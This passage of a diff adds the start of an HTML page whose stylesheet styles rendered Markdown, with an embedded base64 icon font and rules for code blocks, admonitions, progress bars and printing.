@@ -1,0 +1,2668 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><style>body {
+  max-width: 980px;
+  border: 1px solid #ddd;
+  outline: 1300px solid #fff;
+  margin: 16px auto;
+}
+
+body .markdown-body
+{
+  padding: 45px;
+}
+
+@font-face {
+  font-family: fontawesome-mini;
+  src: url(data:font/woff;charset=utf-8;base64,d09GRgABAAAAABE0AA8AAAAAHWwAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAABHU1VCAAABWAAAADsAAABUIIslek9TLzIAAAGUAAAAQwAAAFY3d1HZY21hcAAAAdgAAACqAAACOvWLi0FjdnQgAAAChAAAABMAAAAgBtX/BGZwZ20AAAKYAAAFkAAAC3CKkZBZZ2FzcAAACCgAAAAIAAAACAAAABBnbHlmAAAIMAAABdQAAAjkYT9TNWhlYWQAAA4EAAAAMwAAADYQ6WvNaGhlYQAADjgAAAAfAAAAJAc6A1pobXR4AAAOWAAAACAAAAA0Kmz/7mxvY2EAAA54AAAAHAAAABwQPBJubWF4cAAADpQAAAAgAAAAIAEHC/NuYW1lAAAOtAAAAYQAAALxhQT4h3Bvc3QAABA4AAAAfgAAAMS3SYh9cHJlcAAAELgAAAB6AAAAhuVBK7x4nGNgZGBg4GIwYLBjYHJx8wlh4MtJLMljkGJgYYAAkDwymzEnMz2RgQPGA8qxgGkOIGaDiAIAJjsFSAB4nGNgZHZmnMDAysDAVMW0h4GBoQdCMz5gMGRkAooysDIzYAUBaa4pDA4Pwz+yMwf9z2KIYg5imAYUZgTJAQDcoQvQAHic7ZHNDYJAFIRnBXf94cDRIiyCKkCpwFCPJ092RcKNDoYKcN4+EmMPvpdvk539zQyAPYBCXEUJhBcCrJ5SQ9YLnLJe4qF5rdb+uWPDngNHTkta101pNyWa8lMhn6xx2dqUnW4q9YOIhAOOeueMSgsR/6ry+P7O5s6xVNg4chBsHUuFnWNJ8uZYwrw7chrsHXkODo7cB0dHOYCTY8kv0VE2WJKD6gOlWjsxAAB4nGNgQAMSEMgc9D8LhAESbAPdAHicrVZpd9NGFB15SZyELCULLWphxMRpsEYmbMGACUGyYyBdnK2VoIsUO+m+8Ynf4F/zZNpz6Dd+Wu8bLySQtOdwmpOjd+fN1czbZRJaktgL65GUmy/F1NYmjew8CemGTctRfCg7eyFlisnfBVEQrZbatx2HREQiULWusEQQ+x5ZmmR86FFGy7akV03KLT3pLlvjQb1V334aOsqxO6GkZjN0aD2yJVUYVaJIpj1S0qZlqPorSSu8v8LMV81QwohOImm8GcbQSN4bZ7TKaDW24yiKbLLcKFIkmuFBFHmU1RLn5IoJDMoHzZDyyqcR5cP8iKzYo5xWsEu20/y+L3mndzk/sV9vUbbkQB/Ijuzg7HQlX4RbW2HctJPtKFQRdtd3QmzZ7FT/Zo/ymkYDtysyvdCMYKl8hRArP6HM/iFZLZxP+ZJHo1qykRNB62VO7Es+gdbjiClxzRhZ0N3RCRHU/ZIzDPaYPh788d4plgsTAngcy3pHJZwIEylhczRJ2jByYCVliyqp9a6YOOV1WsRbwn7t2tGXzmjjUHdiPFsPHVs5UcnxaFKnmUyd2knNoykNopR0JnjMrwMoP6JJXm1jNYmVR9M4ZsaERCICLdxLU0EsO7GkKQTNoxm9uRumuXYtWqTJA/Xco/f05la4udNT2g70s0Z/VqdiOtgL0+lp5C/xadrlIkXp+ukZfkziQdYCMpEtNsOUgwdv/Q7Sy9eWHIXXBtju7fMrqH3WRPCkAfsb0B5P1SkJTIWYVYhWQGKta1mWydWsFqnI1HdDmla+rNMEinIcF8e+jHH9XzMzlpgSvt+J07MjLj1z7UsI0xx8m3U9mtepxXIBcWZ5TqdZlu/rNMfyA53mWZ7X6QhLW6ejLD/UaYHlRzodY3lBC5p038GQizDkAg6QMISlA0NYXoIhLBUMYbkIQ1gWYQjLJRjC8mMYwnIZhrC8rGXV1FNJ49qZWAZsQmBijh65zEXlaiq5VEK7aFRqQ54SbpVUFM+qf2WgXjzyhjmwFkiXyJpfMc6Vj0bl+NYVLW8aO1fAsepvH472OfFS1ouFPwX/1dZUJb1izcOTq/Abhp5sJ6o2qXh0TZfPVT26/l9UVFgL9BtIhVgoyrJscGcihI86nYZqoJVDzGzMPLTrdcuan8P9NzFCFlD9+DcUGgvcg05ZSVnt4KzV19uy3DuDcjgTLEkxN/P6VvgiI7PSfpFZyp6PfB5wBYxKZdhqA60VvNknMQ+Z3iTPBHFbUTZI2tjOBIkNHPOAefOdBCZh6qoN5E7hhg34BWFuwXknXKJ6oyyH7kXs8yik/Fun4kT2qGiMwLPZG2Gv70LKb3EMJDT5pX4MVBWhqRg1FdA0Um6oBl/G2bptQsYO9CMqdsOyrOLDxxb3lZJtGYR8pIjVo6Of1l6iTqrcfmYUl++dvgXBIDUxf3vfdHGQyrtayTJHbQNTtxqVU9eaQ+NVh+rmUfW94+wTOWuabronHnpf06rbwcVcLLD2bQ7SUiYX1PVhhQ2iy8WlUOplNEnvuAcYFhjQ71CKjf+r+th8nitVhdFxJN9O1LfR52AM/A/Yf0f1A9D3Y+hyDS7P95oTn2704WyZrqIX66foNzBrrblZugbc0HQD4iFHrY64yg18pwZxeqS5HOkh4GPdFeIBwCaAxeAT3bWM5lMAo/mMOT7A58xh0GQOgy3mMNhmzhrADnMY7DKHwR5zGHzBnHWAL5nDIGQOg4g5DJ4wJwB4yhwGXzGHwdfMYfANc+4DfMscBjFzGCTMYbCv6dYwzC1e0F2gtkFVoANTT1jcw+JQU2XI/o4Xhv29Qcz+wSCm/qjp9pD6Ey8M9WeDmPqLQUz9VdOdIfU3Xhjq7wYx9Q+DmPpMvxjLZQa/jHyXCgeUXWw+5++J9w/bxUC5AAEAAf//AA94nIVVX2hbZRQ/5/t7893s5ja9f7ouzdZ0TTqz3bRJmogbWya6bG6Cq0VbSV2ddIJjFtfIQHEig80Hda8yUN/0YQz8AyriiyD+xQd92R4HCnaCb3samnpumrpsCsLlfPf7zvedc37nL3CAtc/5W/wQZGA3tOBSY/g+TMjHmwzEoM1Q8+ZjRZY4oJhmBw5/YB6Za0yC5AkhlwA1A1yCBIBOwCII0Cj0U8BAMdUCzq05sKwkP7SlUY6fcJk4Fb/RyE79/6P5hjM/F4aZiXBoeMgzcqQ4Xi1hPqfDLG5FT+lchCVU3lYMyvuwhl1mqndQL0RsuloLywHtthLXI06OblTrhfWVnpSJ5+mwu/JdbtuN3IAnkW0LLMcRwaC7ktrlzridM6kVdyf9uO1UNBByI7JhwtG2sEwab07ORBeilWhqavJCqV0qzZTOl/7ZXQ5TbTcdcFelyGhhRDAQpdqp1FEX3w3cFTc1k9pJQkmm4ySCbSikxRP2QOfN+0tHS5MrpQuTU1Mk5nw0E5Xa0WvrOwDyGax9yB9ma6DAg82wHc43SAGTI4GjBWebOePAERFE8/AHaQpZASSTy8A4WwZiLQMQ82mFKATO0ILicRAoDm9p5P99E5b/fXG+kQYY3TYUuqmERWYoT0u/GNYL2q/4WB3LaVS+VynXsVYIcWw6DkCh3nX1D+VzlYN4LClF5yexSQos8exqZ3KVP+wtrC54u4Nznq6cq+xpMpUUnZ8FUYzE86ud0g28NOIv3Gj5/rmA3ABs7S/ywzFuQ4qyd6QxfNtiQIaEgp3w/entQg4Vcbqa16M5FfpeUB8t1+qeg7mI7cUyOe79wOk86gSxkVec4KPTX69++5x68Yubn5/F+w52z7u08sJX7fZXv8ekT/d2mILJxq6sn+SC6qEJknzLJCxyZEKwWVqYmAPBxBE/9DLeZiWHu7lcr/VytrCRuHojncNuTt9h46tmacmYisnSamdN2bZptcsmSysdVsy1PrOvOzF3xN64Rb937t/og9KHxYdcjIUqFAmIAHGHNzlns+RTPgeUYAQm9DwpNxfxbhhBHPaw3/gfTcXO2L+eJVIx5nsyGkvm9X4/f+bGkH45G0PaSjcMXTjcZyTvi3UdHoCDjQd3IDUVsgwYmUoJK/gp4JJxeRI0MKHZIkgynyIBqBTOUs6rOVCojvjZ4mCQz49ZMlMcp8QoYk6NoBfsxnJtsBohpa8iGJS+ZH7gU7NxME6cmF+t7cO9vB8d3jTWSct0ycW9ranXmolNDwmVkNnxe+8JtoztwS5rKJ0xWS95tQ/1zMYzg69MzUZnNtl1ofNbsml/OJm6f9wjRjpnu2o4MzHzn77IQkRd+1DjwMQ2pqSjGMMhyjrgTbBAKksuUm0iU7hI0aN2wOKOq7WYBSH0HGihj/jkiPxAfmwsEbfYrjMG+j3ij932Db/LV7I/xruNrhnroxjR9HRMb2nTvO0ZXOoHPk8H2ZhDPx93qcE/53sH5np/dkIP7zzhTVKdR/BAY/9ElkkR+A6lJGsqpJ4oQcTxpvBT3Kn58VkaJjgHyPEIws57xkaHh9KuVpDEpJZeMbZ5w/zBHi5NMQ4r5VphsFqID7TyB9eR4pX216c3AHxpdAwoqU9qg0ZJ6yVLKmMSz1iG2z27ifx18NkY0LPx1W/wCc2l5LrznrIsiKsqbmB78A9wIGx4tI8rjihVHJyY9pgMirenVq0yWg7Iw7eogG7ZgYM3qR9959A/fZkg6MnD/exlkmc+jWV4SB15XUR+eqC6l6ZmgPtN9z5JMfik05OV8ljylunJ4J+wA/FUaQSSKotsYsCWqaPBidBLcxkWx7XKFRIb45TGaEhjlF9uUVPqXOtcIwsXbBvfoZXIyRYFdkfnqjExH98xpnPczqzjX/uNdO1Y17Wpi5+6Ts8BXtjVFasp9KZ1mOiNbH65c5w6HgmyF2jFCZywM8mWjRc7T5Pmt0lRy7Y71+jYbpGyvwG4sH0XeJxjYGRgYADiwBB/53h+m68M3MwvgCIM1z5N/g6j///9v5H5BbMnkMvBwAQSBQCIcA9gAHicY2BkYGAO+p8FJF/8//v/F/MLBqAICuAFALYQB5kAeJxjfsHAwLwAiCNB+P9fbJjJmoGBMRUo/wKCAfO2EnQAAAAAANoBXgGcAgICVALaA1IDvAPkBAYEPARyAAEAAAANAF0ABAAAAAAAAgAUACQAcwAAAG4LcAAAAAB4nHWRzWrCQBSFT+pPqUIXLXTTzayKUohGKIibCoLuhbrrYtTRxCYZmYyKyz5Fd32HvlDfoO/QkziIFJtw9bvnnpl7ZwLgBt/wcHieGAf2UGd24Atcou+4RH3kuEweO66QXx1XyaHjGh6ROa7jFp/cwStfMVvhy7GHO+/e8QWuvcBxifqz4zL5xXGF/Oa4Sn53XMPE+3Bcx4P3M9DrvYmWoRWNQVN02kFXTPdCU4pSGQu5saE2meiLhU6timPtz3SSs9ypTCdqrJabWJoT5QQnymSRTkXgt0/UkUqVkVbN807ZdtmxdiEWRidi6HqItdErNbN+aO2612qd9sYAGmvsYRBhyUu0EGhQbfK/gzYCdElTOgSdB1eEFBIxFYkNV4RFJWPeZyyYpVQVHTHZx4y/yVGX2LGWFZri51TccUOn5B7nPefVCSPvGhVVwUl9znveO2KkhV8Wk82PZ8qwZf8OVcu1+fSmWCMw/HMOwXvKaysqM+p+cVuWag8tvv+c+xdd+4+teJxtjUEOwiAURJla24KliQfhUA2g/Sl+CKXx+loNrpzVezOLEY34Ron/0WhwQoszOvQYIKFwwQiNSbSBeO2SZ0tBP4j3zVjKNng32ZmtD1VVXCuOiw/pJ8S3WOU6l+K5UOTaDC4+2TjKMtN9KQf1ezLx/Sg/00FCvABHhjDjAAB4nGPw3sFwIihiIyNjX+QGxp0cDBwMyQUbGVidNjEwMmiBGJu5mBg5ICw+BjCLzWkX0wGgNCeQze60i8EBwmZmcNmowtgRGLHBoSNiI3OKy0Y1EG8XRwMDI4tDR3JIBEhJJBBs5mFi5NHawfi/dQNL70YmBhcADHYj9AAA) format('woff');
+}
+
+.markdown-body {
+  font-family: sans-serif;
+  -ms-text-size-adjust: 100%;
+  -webkit-text-size-adjust: 100%;
+  color: #333333;
+  overflow: hidden;
+  font-family: "Helvetica Neue", Helvetica, "Segoe UI", Arial, freesans, sans-serif;
+  font-size: 16px;
+  line-height: 1.6;
+  word-wrap: break-word;
+}
+
+.markdown-body a {
+  background: transparent;
+}
+
+.markdown-body a:active,
+.markdown-body a:hover {
+  outline: 0;
+}
+
+.markdown-body b,
+.markdown-body strong {
+  font-weight: bold;
+}
+
+.markdown-body mark {
+  background: #ff0;
+  color: #000;
+  font-style: italic;
+  font-weight: bold;
+}
+
+.markdown-body sub,
+.markdown-body sup {
+  font-size: 75%;
+  line-height: 0;
+  position: relative;
+  vertical-align: baseline;
+}
+.markdown-body sup {
+  top: -0.5em;
+}
+.markdown-body sub {
+  bottom: -0.25em;
+}
+
+.markdown-body h1 {
+  font-size: 2em;
+  margin: 0.67em 0;
+}
+
+.markdown-body img {
+  border: 0;
+}
+
+.markdown-body hr {
+  -moz-box-sizing: content-box;
+  box-sizing: content-box;
+  height: 0;
+}
+
+.markdown-body pre {
+  overflow: auto;
+}
+
+.markdown-body code,
+.markdown-body kbd,
+.markdown-body pre,
+.markdown-body samp {
+  font-family: monospace, monospace;
+  font-size: 1em;
+}
+
+.markdown-body input {
+  color: inherit;
+  font: inherit;
+  margin: 0;
+}
+
+.markdown-body html input[disabled] {
+  cursor: default;
+}
+
+.markdown-body input {
+  line-height: normal;
+}
+
+.markdown-body input[type="checkbox"] {
+  box-sizing: border-box;
+  padding: 0;
+}
+
+.markdown-body table {
+  border-collapse: collapse;
+  border-spacing: 0;
+}
+
+.markdown-body td,
+.markdown-body th {
+  padding: 0;
+}
+
+.markdown-body .codehilitetable {
+  border: 0;
+  border-spacing: 0;
+}
+
+.markdown-body .codehilitetable tr {
+  border: 0;
+}
+
+.markdown-body .codehilitetable pre,
+.markdown-body .codehilitetable div.codehilite {
+  margin: 0;
+}
+
+.markdown-body .linenos,
+.markdown-body .code,
+.markdown-body .codehilitetable td {
+  border: 0;
+  padding: 0;
+}
+
+.markdown-body td:not(.linenos) .linenodiv {
+  padding: 0 !important;
+}
+
+.markdown-body .code {
+  width: 100%;
+}
+
+.markdown-body .linenos div pre,
+.markdown-body .linenodiv pre,
+.markdown-body .linenodiv {
+  border: 0;
+  -webkit-border-radius: 0;
+  -moz-border-radius: 0;
+  border-radius: 0;
+  -webkit-border-top-left-radius: 3px;
+  -webkit-border-bottom-left-radius: 3px;
+  -moz-border-radius-topleft: 3px;
+  -moz-border-radius-bottomleft: 3px;
+  border-top-left-radius: 3px;
+  border-bottom-left-radius: 3px;
+}
+
+.markdown-body .code div pre,
+.markdown-body .code div {
+  border: 0;
+  -webkit-border-radius: 0;
+  -moz-border-radius: 0;
+  border-radius: 0;
+  -webkit-border-top-right-radius: 3px;
+  -webkit-border-bottom-right-radius: 3px;
+  -moz-border-radius-topright: 3px;
+  -moz-border-radius-bottomright: 3px;
+  border-top-right-radius: 3px;
+  border-bottom-right-radius: 3px;
+}
+
+.markdown-body * {
+  -moz-box-sizing: border-box;
+  box-sizing: border-box;
+}
+
+.markdown-body input {
+  font: 13px Helvetica, arial, freesans, clean, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol";
+  line-height: 1.4;
+}
+
+.markdown-body a {
+  color: #4183c4;
+  text-decoration: none;
+}
+
+.markdown-body a:hover,
+.markdown-body a:focus,
+.markdown-body a:active {
+  text-decoration: underline;
+}
+
+.markdown-body hr {
+  height: 0;
+  margin: 15px 0;
+  overflow: hidden;
+  background: transparent;
+  border: 0;
+  border-bottom: 1px solid #ddd;
+}
+
+.markdown-body hr:before,
+.markdown-body hr:after {
+  display: table;
+  content: " ";
+}
+
+.markdown-body hr:after {
+  clear: both;
+}
+
+.markdown-body h1,
+.markdown-body h2,
+.markdown-body h3,
+.markdown-body h4,
+.markdown-body h5,
+.markdown-body h6 {
+  margin-top: 15px;
+  margin-bottom: 15px;
+  line-height: 1.1;
+}
+
+.markdown-body h1 {
+  font-size: 30px;
+}
+
+.markdown-body h2 {
+  font-size: 21px;
+}
+
+.markdown-body h3 {
+  font-size: 16px;
+}
+
+.markdown-body h4 {
+  font-size: 14px;
+}
+
+.markdown-body h5 {
+  font-size: 12px;
+}
+
+.markdown-body h6 {
+  font-size: 11px;
+}
+
+.markdown-body blockquote {
+  margin: 0;
+}
+
+.markdown-body ul,
+.markdown-body ol {
+  padding: 0;
+  margin-top: 0;
+  margin-bottom: 0;
+}
+
+.markdown-body ol ol,
+.markdown-body ul ol {
+  list-style-type: lower-roman;
+}
+
+.markdown-body ul ul ol,
+.markdown-body ul ol ol,
+.markdown-body ol ul ol,
+.markdown-body ol ol ol {
+  list-style-type: lower-alpha;
+}
+
+.markdown-body dd {
+  margin-left: 0;
+}
+
+.markdown-body code,
+.markdown-body pre,
+.markdown-body samp {
+  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
+  font-size: 12px;
+}
+
+.markdown-body pre {
+  margin-top: 0;
+  margin-bottom: 0;
+}
+
+.markdown-body kbd {
+  background-color: #e7e7e7;
+  background-image: -moz-linear-gradient(#fefefe, #e7e7e7);
+  background-image: -webkit-linear-gradient(#fefefe, #e7e7e7);
+  background-image: linear-gradient(#fefefe, #e7e7e7);
+  background-repeat: repeat-x;
+  border-radius: 2px;
+  border: 1px solid #cfcfcf;
+  color: #000;
+  padding: 3px 5px;
+  line-height: 10px;
+  font: 11px Consolas, "Liberation Mono", Menlo, Courier, monospace;
+  display: inline-block;
+}
+
+.markdown-body>*:first-child {
+  margin-top: 0 !important;
+}
+
+.markdown-body>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+.markdown-body .headerlink {
+  font: normal 400 16px fontawesome-mini;
+  vertical-align: middle;
+  margin-left: -16px;
+  float: left;
+  display: inline-block;
+  text-decoration: none;
+  opacity: 0;
+  color: #333;
+}
+
+.markdown-body .headerlink:focus {
+  outline: none;
+}
+
+.markdown-body h1 .headerlink {
+  margin-top: 0.8rem;
+}
+
+.markdown-body h2 .headerlink,
+.markdown-body h3 .headerlink {
+  margin-top: 0.6rem;
+}
+
+.markdown-body h4 .headerlink {
+  margin-top: 0.2rem;
+}
+
+.markdown-body h5 .headerlink,
+.markdown-body h6 .headerlink {
+  margin-top: 0;
+}
+
+.markdown-body .headerlink:hover,
+.markdown-body h1:hover .headerlink,
+.markdown-body h2:hover .headerlink,
+.markdown-body h3:hover .headerlink,
+.markdown-body h4:hover .headerlink,
+.markdown-body h5:hover .headerlink,
+.markdown-body h6:hover .headerlink {
+  opacity: 1;
+  text-decoration: none;
+}
+
+.markdown-body h1 {
+  padding-bottom: 0.3em;
+  font-size: 2.25em;
+  line-height: 1.2;
+  border-bottom: 1px solid #eee;
+}
+
+.markdown-body h2 {
+  padding-bottom: 0.3em;
+  font-size: 1.75em;
+  line-height: 1.225;
+  border-bottom: 1px solid #eee;
+}
+
+.markdown-body h3 {
+  font-size: 1.5em;
+  line-height: 1.43;
+}
+
+.markdown-body h4 {
+  font-size: 1.25em;
+}
+
+.markdown-body h5 {
+  font-size: 1em;
+}
+
+.markdown-body h6 {
+  font-size: 1em;
+  color: #777;
+}
+
+.markdown-body p,
+.markdown-body blockquote,
+.markdown-body ul,
+.markdown-body ol,
+.markdown-body dl,
+.markdown-body table,
+.markdown-body pre,
+.markdown-body .admonition {
+  margin-top: 0;
+  margin-bottom: 16px;
+}
+
+.markdown-body hr {
+  height: 4px;
+  padding: 0;
+  margin: 16px 0;
+  background-color: #e7e7e7;
+  border: 0 none;
+}
+
+.markdown-body ul,
+.markdown-body ol {
+  padding-left: 2em;
+}
+
+.markdown-body ul ul,
+.markdown-body ul ol,
+.markdown-body ol ol,
+.markdown-body ol ul {
+  margin-top: 0;
+  margin-bottom: 0;
+}
+
+.markdown-body li>p {
+  margin-top: 16px;
+}
+
+.markdown-body dl {
+  padding: 0;
+}
+
+.markdown-body dl dt {
+  padding: 0;
+  margin-top: 16px;
+  font-size: 1em;
+  font-style: italic;
+  font-weight: bold;
+}
+
+.markdown-body dl dd {
+  padding: 0 16px;
+  margin-bottom: 16px;
+}
+
+.markdown-body blockquote {
+  padding: 0 15px;
+  color: #777;
+  border-left: 4px solid #ddd;
+}
+
+.markdown-body blockquote>:first-child {
+  margin-top: 0;
+}
+
+.markdown-body blockquote>:last-child {
+  margin-bottom: 0;
+}
+
+.markdown-body table {
+  display: block;
+  width: 100%;
+  overflow: auto;
+  word-break: normal;
+  word-break: keep-all;
+}
+
+.markdown-body table th {
+  font-weight: bold;
+}
+
+.markdown-body table th,
+.markdown-body table td {
+  padding: 6px 13px;
+  border: 1px solid #ddd;
+}
+
+.markdown-body table tr {
+  background-color: #fff;
+  border-top: 1px solid #ccc;
+}
+
+.markdown-body table tr:nth-child(2n) {
+  background-color: #f8f8f8;
+}
+
+.markdown-body img {
+  max-width: 100%;
+  -moz-box-sizing: border-box;
+  box-sizing: border-box;
+}
+
+.markdown-body code,
+.markdown-body samp {
+  padding: 0;
+  padding-top: 0.2em;
+  padding-bottom: 0.2em;
+  margin: 0;
+  font-size: 85%;
+  background-color: rgba(0,0,0,0.04);
+  border-radius: 3px;
+}
+
+.markdown-body code:before,
+.markdown-body code:after {
+  letter-spacing: -0.2em;
+  content: "\00a0";
+}
+
+.markdown-body pre>code {
+  padding: 0;
+  margin: 0;
+  font-size: 100%;
+  word-break: normal;
+  white-space: pre;
+  background: transparent;
+  border: 0;
+}
+
+.markdown-body .codehilite {
+  margin-bottom: 16px;
+}
+
+.markdown-body .codehilite pre,
+.markdown-body pre {
+  padding: 16px;
+  overflow: auto;
+  font-size: 85%;
+  line-height: 1.45;
+  background-color: #f7f7f7;
+  border-radius: 3px;
+}
+
+.markdown-body .codehilite pre {
+  margin-bottom: 0;
+  word-break: normal;
+}
+
+.markdown-body pre {
+  word-wrap: normal;
+}
+
+.markdown-body pre code {
+  display: inline;
+  max-width: initial;
+  padding: 0;
+  margin: 0;
+  overflow: initial;
+  line-height: inherit;
+  word-wrap: normal;
+  background-color: transparent;
+  border: 0;
+}
+
+.markdown-body pre code:before,
+.markdown-body pre code:after {
+  content: normal;
+}
+
+/* Admonition */
+.markdown-body .admonition {
+  -webkit-border-radius: 3px;
+  -moz-border-radius: 3px;
+  position: relative;
+  border-radius: 3px;
+  border: 1px solid #e0e0e0;
+  border-left: 6px solid #333;
+  padding: 10px 10px 10px 30px;
+}
+
+.markdown-body .admonition table {
+  color: #333;
+}
+
+.markdown-body .admonition p {
+  padding: 0;
+}
+
+.markdown-body .admonition-title {
+  font-weight: bold;
+  margin: 0;
+}
+
+.markdown-body .admonition>.admonition-title {
+  color: #333;
+}
+
+.markdown-body .attention>.admonition-title {
+  color: #a6d796;
+}
+
+.markdown-body .caution>.admonition-title {
+  color: #d7a796;
+}
+
+.markdown-body .hint>.admonition-title {
+  color: #96c6d7;
+}
+
+.markdown-body .danger>.admonition-title {
+  color: #c25f77;
+}
+
+.markdown-body .question>.admonition-title {
+  color: #96a6d7;
+}
+
+.markdown-body .note>.admonition-title {
+  color: #d7c896;
+}
+
+.markdown-body .admonition:before,
+.markdown-body .attention:before,
+.markdown-body .caution:before,
+.markdown-body .hint:before,
+.markdown-body .danger:before,
+.markdown-body .question:before,
+.markdown-body .note:before {
+  font: normal normal 16px fontawesome-mini;
+  -moz-osx-font-smoothing: grayscale;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+  line-height: 1.5;
+  color: #333;
+  position: absolute;
+  left: 0;
+  top: 0;
+  padding-top: 10px;
+  padding-left: 10px;
+}
+
+.markdown-body .admonition:before {
+  content: "\f056\00a0";
+  color: 333;
+}
+
+.markdown-body .attention:before {
+  content: "\f058\00a0";
+  color: #a6d796;
+}
+
+.markdown-body .caution:before {
+  content: "\f06a\00a0";
+  color: #d7a796;
+}
+
+.markdown-body .hint:before {
+  content: "\f05a\00a0";
+  color: #96c6d7;
+}
+
+.markdown-body .danger:before {
+  content: "\f057\00a0";
+  color: #c25f77;
+}
+
+.markdown-body .question:before {
+  content: "\f059\00a0";
+  color: #96a6d7;
+}
+
+.markdown-body .note:before {
+  content: "\f040\00a0";
+  color: #d7c896;
+}
+
+.markdown-body .admonition::after {
+  content: normal;
+}
+
+.markdown-body .attention {
+  border-left: 6px solid #a6d796;
+}
+
+.markdown-body .caution {
+  border-left: 6px solid #d7a796;
+}
+
+.markdown-body .hint {
+  border-left: 6px solid #96c6d7;
+}
+
+.markdown-body .danger {
+  border-left: 6px solid #c25f77;
+}
+
+.markdown-body .question {
+  border-left: 6px solid #96a6d7;
+}
+
+.markdown-body .note {
+  border-left: 6px solid #d7c896;
+}
+
+.markdown-body .admonition>*:first-child {
+  margin-top: 0 !important;
+}
+
+.markdown-body .admonition>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+/* progress bar*/
+.markdown-body .progress {
+  display: block;
+  width: 300px;
+  margin: 10px 0;
+  height: 24px;
+  -webkit-border-radius: 3px;
+  -moz-border-radius: 3px;
+  border-radius: 3px;
+  background-color: #ededed;
+  position: relative;
+  box-shadow: inset -1px 1px 3px rgba(0, 0, 0, .1);
+}
+
+.markdown-body .progress-label {
+  position: absolute;
+  text-align: center;
+  font-weight: bold;
+  width: 100%; margin: 0;
+  line-height: 24px;
+  color: #333;
+  text-shadow: 1px 1px 0 #fefefe, -1px -1px 0 #fefefe, -1px 1px 0 #fefefe, 1px -1px 0 #fefefe, 0 1px 0 #fefefe, 0 -1px 0 #fefefe, 1px 0 0 #fefefe, -1px 0 0 #fefefe, 1px 1px 2px #000;
+  -webkit-font-smoothing: antialiased !important;
+  white-space: nowrap;
+  overflow: hidden;
+}
+
+.markdown-body .progress-bar {
+  height: 24px;
+  float: left;
+  -webkit-border-radius: 3px;
+  -moz-border-radius: 3px;
+  border-radius: 3px;
+  background-color: #96c6d7;
+  box-shadow: inset 0 1px 0 rgba(255, 255, 255, .5), inset 0 -1px 0 rgba(0, 0, 0, .1);
+  background-size: 30px 30px;
+  background-image: -webkit-linear-gradient(
+    135deg, rgba(255, 255, 255, .4) 27%,
+    transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%,
+    transparent 77%, transparent
+  );
+  background-image: -moz-linear-gradient(
+    135deg,
+    rgba(255, 255, 255, .4) 27%, transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%, transparent 77%,
+    transparent
+  );
+  background-image: -ms-linear-gradient(
+    135deg,
+    rgba(255, 255, 255, .4) 27%, transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%, transparent 77%,
+    transparent
+  );
+  background-image: -o-linear-gradient(
+    135deg,
+    rgba(255, 255, 255, .4) 27%, transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%, transparent 77%,
+    transparent
+  );
+  background-image: linear-gradient(
+    135deg,
+    rgba(255, 255, 255, .4) 27%, transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%, transparent 77%,
+    transparent
+  );
+}
+
+.markdown-body .progress-100plus .progress-bar {
+  background-color: #a6d796;
+}
+
+.markdown-body .progress-80plus .progress-bar {
+  background-color: #c6d796;
+}
+
+.markdown-body .progress-60plus .progress-bar {
+  background-color: #d7c896;
+}
+
+.markdown-body .progress-40plus .progress-bar {
+  background-color: #d7a796;
+}
+
+.markdown-body .progress-20plus .progress-bar {
+  background-color: #d796a6;
+}
+
+.markdown-body .progress-0plus .progress-bar {
+  background-color: #c25f77;
+}
+
+.markdown-body .candystripe-animate .progress-bar{
+  -webkit-animation: animate-stripes 3s linear infinite;
+  -moz-animation: animate-stripes 3s linear infinite;
+  animation: animate-stripes 3s linear infinite;
+}
+
+@-webkit-keyframes animate-stripes {
+  0% {
+    background-position: 0 0;
+  }
+
+  100% {
+    background-position: 60px 0;
+  }
+}
+
+@-moz-keyframes animate-stripes {
+  0% {
+    background-position: 0 0;
+  }
+
+  100% {
+    background-position: 60px 0;
+  }
+}
+
+@keyframes animate-stripes {
+  0% {
+    background-position: 0 0;
+  }
+
+  100% {
+    background-position: 60px 0;
+  }
+}
+
+.markdown-body .gloss .progress-bar {
+  box-shadow:
+    inset 0 4px 12px rgba(255, 255, 255, .7),
+    inset 0 -12px 0 rgba(0, 0, 0, .05);
+}
+
+/* MultiMarkdown Critic Blocks */
+.markdown-body .critic_mark {
+  background: #ff0;
+}
+
+.markdown-body .critic_delete {
+  color: #c82829;
+  text-decoration: line-through;
+}
+
+.markdown-body .critic_insert {
+  color: #718c00 ;
+  text-decoration: underline;
+}
+
+.markdown-body .critic_comment {
+  color: #8e908c;
+  font-style: italic;
+}
+
+.markdown-body .headeranchor {
+  font: normal normal 16px fontawesome-mini;
+  line-height: 1;
+  display: inline-block;
+  text-decoration: none;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+}
+
+.headeranchor:before {
+  content: '\e157';
+}
+
+.markdown-body .task-list-item {
+  list-style-type: none;
+}
+
+.markdown-body .task-list-item+.task-list-item {
+  margin-top: 3px;
+}
+
+.markdown-body .task-list-item input {
+  margin: 0 4px 0.25em -20px;
+  vertical-align: middle;
+}
+
+/* Media */
+@media only screen and (min-width: 480px) {
+  .markdown-body {
+    font-size:14px;
+  }
+}
+
+@media only screen and (min-width: 768px) {
+  .markdown-body {
+    font-size:16px;
+  }
+}
+
+@media print {
+  .markdown-body * {
+    background: transparent !important;
+    color: black !important;
+    filter:none !important;
+    -ms-filter: none !important;
+  }
+
+  .markdown-body {
+    font-size:12pt;
+    max-width:100%;
+    outline:none;
+    border: 0;
+  }
+
+  .markdown-body a,
+  .markdown-body a:visited {
+    text-decoration: underline;
+  }
+
+  .markdown-body .headeranchor-link {
+    display: none;
+  }
+
+  .markdown-body a[href]:after {
+    content: " (" attr(href) ")";
+  }
+
